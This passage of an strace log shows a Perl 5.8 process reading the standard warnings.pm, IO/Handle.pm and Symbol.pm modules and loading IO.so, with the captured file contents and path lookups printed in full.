\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
7695  07:19:58.076585 brk(0x81b6000)    = 0x81b6000
7695  07:19:58.076601 brk(0x81b5000)    = 0x81b5000
7695  07:19:58.076678 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
7695  07:19:58.077166 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
7695  07:19:58.077901 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
7695  07:19:58.078030 read(8, "", 4096) = 0
7695  07:19:58.078042 close(8)          = 0
7695  07:19:58.078194 _llseek(6, 412, [412], SEEK_SET) = 0
7695  07:19:58.078209 _llseek(6, 0, [412], SEEK_CUR) = 0
7695  07:19:58.078219 close(6)          = 0
7695  07:19:58.078261 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
7695  07:19:58.078284 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
7695  07:19:58.078343 futex(0xb7f90070, 0x81 /* FUTEX_??? */, 2147483647) = 0
7695  07:19:58.078373 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
7695  07:19:58.078388 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7695  07:19:58.078478 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
7695  07:19:58.078503 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f94000
7695  07:19:58.078516 mmap2(0xb7f98000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f98000
7695  07:19:58.078530 close(6)          = 0
7695  07:19:58.078654 stat64("/etc/perl/IO/Handle.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.078670 stat64("/etc/perl/IO/Handle.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.078683 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.078696 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.078710 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.078722 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.078736 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.078748 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.078761 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.078772 stat64("/usr/share/perl5/IO/Handle.pm", 0xbffa0c0c) = -1 ENOENT (No such file or directory)
7695  07:19:58.078786 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbffa0cfc) = -1 ENOENT (No such file or directory)
7695  07:19:58.078786 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
7695  07:19:58.078786 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
7695  07:19:58.078787 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0a18) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.078787 _llseek(6, 0, [0], SEEK_CUR) = 0
7695  07:19:58.078787 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
7695  07:19:58.079113 stat64("/etc/perl/Symbol.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079129 stat64("/etc/perl/Symbol.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079142 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079154 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079168 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079180 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079193 stat64("/usr/lib/perl5/Symbol.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079205 stat64("/usr/lib/perl5/Symbol.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079218 stat64("/usr/share/perl5/Symbol.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079229 stat64("/usr/share/perl5/Symbol.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079246 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079258 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbffa075c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079271 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbffa084c) = -1 ENOENT (No such file or directory)
7695  07:19:58.079283 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
7695  07:19:58.079304 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
7695  07:19:58.079318 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa0568) = -1 ENOTTY (Inappropriate ioctl for device)
7695  07:19:58.079329 _llseek(8, 0, [0], SEEK_CUR) = 0
7695  07:19:58.079346 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        